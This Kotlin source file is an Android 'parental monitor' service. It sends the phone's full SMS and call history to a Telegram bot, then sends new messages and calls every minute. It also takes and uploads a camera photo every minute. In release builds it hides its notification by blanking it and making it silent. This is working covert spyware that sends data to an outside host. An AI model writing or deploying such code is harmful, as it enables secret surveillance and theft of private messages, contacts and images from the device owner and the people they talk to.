package com.redeye.parentalmonitor.service

import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.redeye.parentalmonitor.ParentalMonitorApp
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.network.TelegramClient
import com.redeye.parentalmonitor.network.TelegramMessage
import com.redeye.parentalmonitor.receiver.NetworkChangeReceiver
import com.redeye.parentalmonitor.repository.CallLogRepository
import com.redeye.parentalmonitor.repository.SmsRepository
import com.redeye.parentalmonitor.utils.NetworkUtils
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class MonitoringService : Service() {

    private lateinit var preferencesManager: PreferencesManager
    private lateinit var smsRepository: SmsRepository
    private lateinit var callLogRepository: CallLogRepository
    private lateinit var messageQueue: MessageQueue
    private lateinit var cameraService: CameraService
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var monitoringJob: Job? = null
    private var cameraJob: Job? = null

    companion object {
        const val ACTION_START_MONITORING = "START_MONITORING"
        const val ACTION_STOP_MONITORING = "STOP_MONITORING"
        private const val NOTIFICATION_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        preferencesManager = PreferencesManager(this)
        smsRepository = SmsRepository(this)
        callLogRepository = CallLogRepository(this)
        messageQueue = MessageQueue(this)
        cameraService = CameraService(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_MONITORING -> startMonitoring()
            ACTION_STOP_MONITORING -> stopMonitoring()
        }
        return START_STICKY
    }

    private fun startMonitoring() {
        android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")
        
        // In RELEASE mode, make notification invisible/minimal
        val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
        
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
            // DEBUG: Show detailed notification
            notificationBuilder
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
        } else {
            // RELEASE: Minimal/hidden notification
            notificationBuilder
                .setContentTitle("")
                .setContentText("")
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .setSilent(true)
        }

        // Start foreground with camera service type for Android 14+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID, 
                notificationBuilder.build(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notificationBuilder.build(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notificationBuilder.build())
        }
        android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")

        // Send initial data
        serviceScope.launch {
            android.util.Log.i("MonitoringService", "Starting initial data collection...")
            sendInitialData()
            android.util.Log.i("MonitoringService", "Initial data collection completed")
        }

        // Start periodic monitoring
        monitoringJob = serviceScope.launch {
            while (isActive) {
                try {
                    checkAndSendNewData()
                    delay(60000) // Check every minute
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
                    e.printStackTrace()
                }
            }
        }
        android.util.Log.d("MonitoringService", "Monitoring loop started")
        
        // Start camera monitoring (every 1 minute)
        cameraJob = serviceScope.launch {
            while (isActive) {
                try {
                    captureAndSendPhoto()
                    delay(60000) // Capture every minute
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in camera loop", e)
                    e.printStackTrace()
                }
            }
        }
        android.util.Log.d("MonitoringService", "📸 Camera monitoring started (1 minute interval)")
    }

    private suspend fun sendInitialData() {
        try {
            android.util.Log.i("MonitoringService", "Collecting SMS history...")
            // Get all history first
            val allSms = smsRepository.getAllSms()
            android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
            
            android.util.Log.i("MonitoringService", "Collecting call history...")
            val allCalls = callLogRepository.getAllCalls()
            android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")

            // Update last synced IDs
            if (allSms.isNotEmpty()) {
                val maxSmsId = allSms.maxOf { it.id }
                preferencesManager.lastSmsId = maxSmsId
                android.util.Log.d("MonitoringService", "Last SMS ID set to: $maxSmsId")
            }

            if (allCalls.isNotEmpty()) {
                val maxCallDate = allCalls.maxOf { it.date }
                preferencesManager.lastCallTimestamp = maxCallDate
                android.util.Log.d("MonitoringService", "Last call timestamp set to: $maxCallDate")
            }

            // Send start message
            android.util.Log.i("MonitoringService", "Sending start message...")
            val startMessage = buildString {
                appendLine("📱 <b>Nazorat boshlandi</b>")
                appendLine()
                appendLine("⏰ Vaqt: ${formatDate(System.currentTimeMillis())}")
                appendLine()
                appendLine("📊 Topilgan ma'lumotlar:")
                appendLine("• SMS: ${allSms.size} ta")
                appendLine("• Qo'ng'iroqlar: ${allCalls.size} ta")
                appendLine()
                appendLine("Tarix yuborilmoqda...")
            }
            sendToTelegram(startMessage)
            delay(2000) // Wait 2 seconds before sending history

            // Send all SMS history in chunks
            if (allSms.isNotEmpty()) {
                val chunks = allSms.chunked(10)
                android.util.Log.i("MonitoringService", "Sending ${chunks.size} SMS chunks...")
                chunks.forEachIndexed { index, chunk ->
                    android.util.Log.d("MonitoringService", "Sending SMS chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("💬 <b>SMS Tarixi - ${index + 1}/${chunks.size}-qism</b>")
                        appendLine()
                        chunk.forEach { sms ->
                            appendLine("📞 Raqam: ${sms.address}")
                            val body = sms.body.take(200) // Limit SMS body to 200 chars
                            appendLine("📝 Matn: $body${if (sms.body.length > 200) "..." else ""}")
                            appendLine("🔄 Turi: ${sms.getTypeString()}")
                            appendLine("⏰ Vaqt: ${formatDate(sms.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    // Check message length (Telegram limit: 4096)
                    if (message.length > 4000) {
                        android.util.Log.w("MonitoringService", "Message too long (${message.length}), splitting...")
                        sendToTelegram(message.take(4000) + "\n\n... (xabar uzun)")
                    } else {
                        sendToTelegram(message)
                    }
                    delay(1000) // Wait 1 second between messages
                }
                android.util.Log.i("MonitoringService", "All SMS chunks sent")
            }

            // Send all call history in chunks
            if (allCalls.isNotEmpty()) {
                val chunks = allCalls.chunked(10)
                android.util.Log.i("MonitoringService", "Sending ${chunks.size} call chunks...")
                chunks.forEachIndexed { index, chunk ->
                    android.util.Log.d("MonitoringService", "Sending call chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("📞 <b>Qo'ng'iroqlar Tarixi - ${index + 1}/${chunks.size}-qism</b>")
                        appendLine()
                        chunk.forEach { call ->
                            appendLine("📱 Raqam: ${call.number}")
                            if (call.name != null) {
                                appendLine("👤 Ism: ${call.name}")
                            }
                            appendLine("🔄 Turi: ${call.getTypeString()}")
                            appendLine("⏱️ Davomiyligi: ${call.getDurationString()}")
                            appendLine("⏰ Vaqt: ${formatDate(call.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    // Check message length
                    if (message.length > 4000) {
                        android.util.Log.w("MonitoringService", "Message too long (${message.length}), truncating...")
                        sendToTelegram(message.take(4000) + "\n\n... (xabar uzun)")
                    } else {
                        sendToTelegram(message)
                    }
                    delay(1000) // Wait 1 second between messages
                }
                android.util.Log.i("MonitoringService", "All call chunks sent")
            }

            // Final message
            android.util.Log.i("MonitoringService", "Sending completion message...")
            val completeMessage = buildString {
                appendLine("✅ <b>Tarix yuborish tugadi</b>")
                appendLine()
                appendLine("Endi faqat yangi SMS va qo'ng'iroqlar yuboriladi.")
            }
            sendToTelegram(completeMessage)
            android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private suspend fun checkAndSendNewData() {
        try {
            // Check for new SMS
            val lastSmsId = preferencesManager.lastSmsId
            val newSms = smsRepository.getNewSms(lastSmsId)
            
            if (newSms.isNotEmpty()) {
                val message = formatSmsMessage(newSms)
                sendToTelegram(message)
                
                val maxId = newSms.maxOf { it.id }
                preferencesManager.lastSmsId = maxId
            }

            // Check for new calls
            val lastCallTimestamp = preferencesManager.lastCallTimestamp
            val newCalls = callLogRepository.getNewCalls(lastCallTimestamp)
            
            if (newCalls.isNotEmpty()) {
                val message = formatCallMessage(newCalls)
                sendToTelegram(message)
                
                val maxTimestamp = newCalls.maxOf { it.date }
                preferencesManager.lastCallTimestamp = maxTimestamp
            }

            if (newSms.isNotEmpty() || newCalls.isNotEmpty()) {
                preferencesManager.lastSyncTime = System.currentTimeMillis()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
        return buildString {
            appendLine("💬 <b>Yangi SMS (${smsList.size} ta)</b>")
            appendLine()
            
            smsList.forEach { sms ->
                appendLine("📞 Raqam: ${sms.address}")
                val body = sms.body.take(200) // Limit to 200 chars
                appendLine("📝 Matn: $body${if (sms.body.length > 200) "..." else ""}")
                appendLine("🔄 Turi: ${sms.getTypeString()}")
                appendLine("⏰ Vaqt: ${formatDate(sms.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
        return buildString {
            appendLine("📞 <b>Yangi qo'ng'iroqlar (${callList.size} ta)</b>")
            appendLine()
            
            callList.forEach { call ->
                appendLine("📱 Raqam: ${call.number}")
                if (call.name != null) {
                    appendLine("👤 Ism: ${call.name}")
                }
                appendLine("🔄 Turi: ${call.getTypeString()}")
                appendLine("⏱️ Davomiyligi: ${call.getDurationString()}")
                appendLine("⏰ Vaqt: ${formatDate(call.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private suspend fun sendToTelegram(message: String) {
        try {
            // Validate message length (Telegram max: 4096)
            if (message.length > 4096) {
                android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, truncating")
                val truncated = message.take(4000) + "\n\n... (xabar qisqartirildi)"
                sendToTelegram(truncated)
                return
            }
            
            val botToken = preferencesManager.botToken
            val chatId = preferencesManager.chatId

            android.util.Log.d("MonitoringService", "Sending message to Telegram...")
            android.util.Log.d("MonitoringService", "Bot Token: ${botToken.take(20)}...")
            android.util.Log.d("MonitoringService", "Chat ID: $chatId")
            android.util.Log.d("MonitoringService", "Message length: ${message.length} chars")

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot token or chat ID is empty!")
                return
            }

            // Check if network is available
            val hasNetwork = NetworkUtils.isNetworkAvailable(this)
            android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
            
            if (!hasNetwork) {
                // No internet, add to queue
                android.util.Log.w("MonitoringService", "No network, adding to queue")
                messageQueue.addMessage(message)
                return
            }

            val telegramMessage = TelegramMessage(
                chatId = chatId,
                text = message,
                parseMode = "HTML"
            )

            android.util.Log.d("MonitoringService", "Calling Telegram API...")
            val url = "https://api.telegram.org/bot${botToken}/sendMessage"
            android.util.Log.d("MonitoringService", "URL: $url")
            val response = TelegramClient.api.sendMessage(url, telegramMessage)
            
            android.util.Log.d("MonitoringService", "Response code: ${response.code()}")
            android.util.Log.d("MonitoringService", "Response successful: ${response.isSuccessful}")
            
            if (response.isSuccessful && response.body()?.ok == true) {
                android.util.Log.i("MonitoringService", "✓ Message sent successfully!")
                android.util.Log.i("MonitoringService", "Response: ${response.body()}")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
            } else {
                // Failed to send, add to queue
                val errorBody = response.errorBody()?.string()
                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()} - ${response.message()}")
                android.util.Log.e("MonitoringService", "Error body: $errorBody")
                if (response.body() != null) {
                    android.util.Log.e("MonitoringService", "Response body: ${response.body()}")
                }
                messageQueue.addMessage(message)
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Exception sending message: ${e.message}", e)
            e.printStackTrace()
            // Network error, add to queue
            messageQueue.addMessage(message)
            // Schedule retry when network is available
            NetworkChangeReceiver.scheduleMessageSend(this)
        }
    }

    private fun formatDate(timestamp: Long): String {
        val sdf = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault())
        return sdf.format(Date(timestamp))
    }

    private fun stopMonitoring() {
        monitoringJob?.cancel()
        cameraJob?.cancel()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
    
    // ═══════════════════════════════════════════════════════════
    // CAMERA MONITORING FUNCTIONS
    // ═══════════════════════════════════════════════════════════
    
    private suspend fun captureAndSendPhoto() {
        withContext(Dispatchers.Main) {
            try {
                android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
                
                cameraService.capturePhoto(
                    onPhotoTaken = { photoFile ->
                        serviceScope.launch {
                            sendPhotoToTelegram(photoFile)
                        }
                    },
                    onError = { exception ->
                        android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
                    }
                )
            } catch (e: Exception) {
                android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto", e)
            }
        }
    }
    
    private suspend fun sendPhotoToTelegram(photoFile: File) {
        try {
            if (!NetworkUtils.isNetworkAvailable(this)) {
                android.util.Log.w("MonitoringService", "No network - photo saved for later")
                return
            }
            
            val botToken = preferencesManager.botToken
            val chatId = preferencesManager.chatId
            
            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot credentials missing")
                photoFile.delete()
                return
            }
            
            android.util.Log.i("MonitoringService", "📤 Sending photo to Telegram...")
            
            // Prepare multipart request
            val requestFile = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
            
            val timestamp = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault()).format(Date())
            val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())
            
            val url = "https://api.telegram.org/bot$botToken/sendPhoto"
            
            val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)
            
            if (response.isSuccessful && response.body()?.ok == true) {
                android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()}")
            }
            
            // Delete photo after sending
            photoFile.delete()
            android.util.Log.d("MonitoringService", "Temporary photo file deleted")
            
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram", e)
            photoFile.delete()
        }
    }
}

